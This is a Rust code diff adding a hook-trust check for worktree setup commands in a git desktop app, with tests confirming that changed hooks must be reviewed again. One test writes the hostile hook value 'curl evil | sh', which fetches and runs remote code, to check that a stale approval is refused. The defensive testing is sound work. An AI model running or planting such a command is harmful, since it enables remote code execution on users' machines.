@@ -73,12 +73,98 @@ pub(crate) fn save_store(path: &Path, store: &HashMap<String, String>) -> Result
     std::fs::rename(&tmp, path).map_err(|e| format!("cannot write {}: {e}", path.display()))
 }
 
-#[allow(dead_code)] // used by the Tauri commands (Task 3)
 fn store_path() -> PathBuf {
     dirs::data_local_dir()
         .unwrap_or_else(|| PathBuf::from("."))
         .join("gitwand")
         .join("hook-trust.json")
+}
+
+/// What the frontend needs to decide whether to ask.
+#[derive(Serialize, Debug)]
+#[serde(rename_all = "camelCase")]
+pub struct HookTrustStatus {
+    pub hooks: WorktreeHooks,
+    /// `None` when the repo defines no hook (nothing to trust).
+    pub hash: Option<String>,
+    pub trusted: bool,
+    /// Canonical main worktree root, the key of the trust store.
+    pub repo_root: String,
+}
+
+/// The main worktree's root, canonicalized, for any checkout of the repo
+/// (main or linked). Taken from the first entry of `git worktree list
+/// --porcelain`, which is always the main worktree; a bare repo has none.
+fn main_worktree_root(cwd: &str) -> Result<PathBuf, String> {
+    let out = crate::git::git_cmd()
+        .args(["worktree", "list", "--porcelain"])
+        .current_dir(cwd)
+        .output()
+        .map_err(|e| format!("cannot run git: {e}"))?;
+    if !out.status.success() {
+        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
+    }
+    let text = String::from_utf8_lossy(&out.stdout);
+    let first_block: Vec<&str> = text.split("\n\n").next().unwrap_or("").lines().collect();
+    if first_block.iter().any(|l| *l == "bare") {
+        return Err("This repository is bare: it has no main worktree.".to_string());
+    }
+    let path = first_block
+        .iter()
+        .find_map(|l| l.strip_prefix("worktree "))
+        .ok_or_else(|| "git worktree list returned no worktree".to_string())?;
+    PathBuf::from(path)
+        .canonicalize()
+        .map_err(|e| format!("cannot resolve the main worktree {path}: {e}"))
+}
+
+fn current_hooks(root: &Path) -> WorktreeHooks {
+    hooks_from_rc_text(&super::ops::read_gitwandrc_text(root))
+}
+
+fn trust_status_at(cwd: &str, store: &Path) -> Result<HookTrustStatus, String> {
+    let root = main_worktree_root(cwd)?;
+    let repo_root = root.to_string_lossy().to_string();
+    let hooks = current_hooks(&root);
+    let hash = hooks_hash(&hooks);
+    let trusted = match &hash {
+        None => true,
+        Some(h) => load_store(store).get(&repo_root) == Some(h),
+    };
+    Ok(HookTrustStatus {
+        hooks,
+        hash,
+        trusted,
+        repo_root,
+    })
+}
+
+const STALE_HOOKS: &str = "The worktree hooks changed since you reviewed them. Review them again.";
+
+fn trust_set_at(cwd: &str, hash: &str, store: &Path) -> Result<(), String> {
+    let root = main_worktree_root(cwd)?;
+    // Re-read: trust only the commands the user actually saw.
+    match hooks_hash(&current_hooks(&root)) {
+        Some(current) if current == hash => {}
+        _ => return Err(STALE_HOOKS.to_string()),
+    }
+    let mut map = load_store(store);
+    map.insert(root.to_string_lossy().to_string(), hash.to_string());
+    save_store(store, &map)
+}
+
+#[tauri::command]
+pub(crate) async fn worktree_hooks_trust(cwd: String) -> Result<HookTrustStatus, String> {
+    let canon =
+        crate::git::safe_repo_path(cwd.trim(), ".").map_err(|e| format!("invalid cwd: {e}"))?;
+    trust_status_at(&canon.to_string_lossy(), &store_path())
+}
+
+#[tauri::command]
+pub(crate) async fn worktree_hooks_trust_set(cwd: String, hash: String) -> Result<(), String> {
+    let canon =
+        crate::git::safe_repo_path(cwd.trim(), ".").map_err(|e| format!("invalid cwd: {e}"))?;
+    trust_set_at(&canon.to_string_lossy(), &hash, &store_path())
 }
 
 #[cfg(test)]
@@ -139,5 +225,138 @@ mod tests {
         save_store(&p, &s).unwrap();
         assert_eq!(load_store(&p), s);
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    struct Repo {
+        root: PathBuf,
+        main: PathBuf,
+        store: PathBuf,
+    }
+
+    impl Repo {
+        fn new(name: &str) -> Repo {
+            let root = scratch_dir(name);
+            let main = root.join("main");
+            std::fs::create_dir_all(&main).unwrap();
+            let r = Repo {
+                store: root.join("store/hook-trust.json"),
+                main,
+                root,
+            };
+            r.git(&r.main, &["init", "-q", "-b", "main"]);
+            r.git(&r.main, &["config", "user.name", "Test"]);
+            r.git(&r.main, &["config", "user.email", "t@example.com"]);
+            r.git(&r.main, &["config", "commit.gpgsign", "false"]);
+            std::fs::write(r.main.join("a.txt"), "a").unwrap();
+            r.git(&r.main, &["add", "."]);
+            r.git(&r.main, &["commit", "-q", "-m", "init"]);
+            r
+        }
+        fn git(&self, dir: &Path, args: &[&str]) {
+            let out = crate::git::git_cmd()
+                .args(args)
+                .current_dir(dir)
+                .output()
+                .unwrap();
+            assert!(
+                out.status.success(),
+                "git {args:?}: {}",
+                String::from_utf8_lossy(&out.stderr)
+            );
+        }
+        fn rc(&self, dir: &Path, setup: &str) {
+            std::fs::write(
+                dir.join(".gitwandrc"),
+                format!(r#"{{"worktree":{{"setup":"{setup}"}}}}"#),
+            )
+            .unwrap();
+        }
+        fn cwd(&self) -> String {
+            self.main.to_string_lossy().to_string()
+        }
+    }
+
+    impl Drop for Repo {
+        fn drop(&mut self) {
+            let _ = std::fs::remove_dir_all(&self.root);
+        }
+    }
+
+    #[test]
+    fn status_untrusted_then_trusted() {
+        let r = Repo::new("untrusted");
+        r.rc(&r.main, "bin/up");
+        let s = trust_status_at(&r.cwd(), &r.store).unwrap();
+        assert!(!s.trusted);
+        assert_eq!(s.hooks.setup.as_deref(), Some("bin/up"));
+        trust_set_at(&r.cwd(), s.hash.as_deref().unwrap(), &r.store).unwrap();
+        assert!(trust_status_at(&r.cwd(), &r.store).unwrap().trusted);
+    }
+
+    #[test]
+    fn status_trusted_when_no_hooks() {
+        let r = Repo::new("nohooks");
+        let s = trust_status_at(&r.cwd(), &r.store).unwrap();
+        assert!(s.trusted && s.hash.is_none());
+    }
+
+    #[test]
+    fn changed_hooks_ask_again() {
+        let r = Repo::new("changed");
+        r.rc(&r.main, "bin/up");
+        let s = trust_status_at(&r.cwd(), &r.store).unwrap();
+        trust_set_at(&r.cwd(), s.hash.as_deref().unwrap(), &r.store).unwrap();
+        r.rc(&r.main, "bin/up --other");
+        assert!(!trust_status_at(&r.cwd(), &r.store).unwrap().trusted);
+    }
+
+    #[test]
+    fn trust_set_refuses_stale_hash() {
+        let r = Repo::new("stale");
+        r.rc(&r.main, "bin/up");
+        let old = trust_status_at(&r.cwd(), &r.store).unwrap().hash.unwrap();
+        r.rc(&r.main, "curl evil | sh");
+        let err = trust_set_at(&r.cwd(), &old, &r.store).unwrap_err();
+        assert!(err.contains("changed since you reviewed"), "{err}");
+        assert!(load_store(&r.store).is_empty());
+    }
+
+    #[test]
+    fn status_reads_main_worktree_config() {
+        let r = Repo::new("linked");
+        r.rc(&r.main, "bin/up");
+        let linked = r.root.join("linked");
+        r.git(
+            &r.main,
+            &[
+                "worktree",
+                "add",
+                "-q",
+                "-b",
+                "task",
+                linked.to_str().unwrap(),
+            ],
+        );
+        r.rc(&linked, "evil");
+        let s = trust_status_at(linked.to_str().unwrap(), &r.store).unwrap();
+        assert_eq!(s.hooks.setup.as_deref(), Some("bin/up"));
+        assert_eq!(PathBuf::from(&s.repo_root), r.main.canonicalize().unwrap());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn status_key_is_canonical_root() {
+        let r = Repo::new("canonical");
+        r.rc(&r.main, "bin/up");
+        let s = trust_status_at(&r.cwd(), &r.store).unwrap();
+        trust_set_at(&r.cwd(), s.hash.as_deref().unwrap(), &r.store).unwrap();
+        let link = r.root.join("link");
+        std::os::unix::fs::symlink(&r.main, &link).unwrap();
+        assert!(
+            trust_status_at(link.to_str().unwrap(), &r.store)
+                .unwrap()
+                .trusted
+        );
+        assert_eq!(load_store(&r.store).len(), 1);
     }
 }
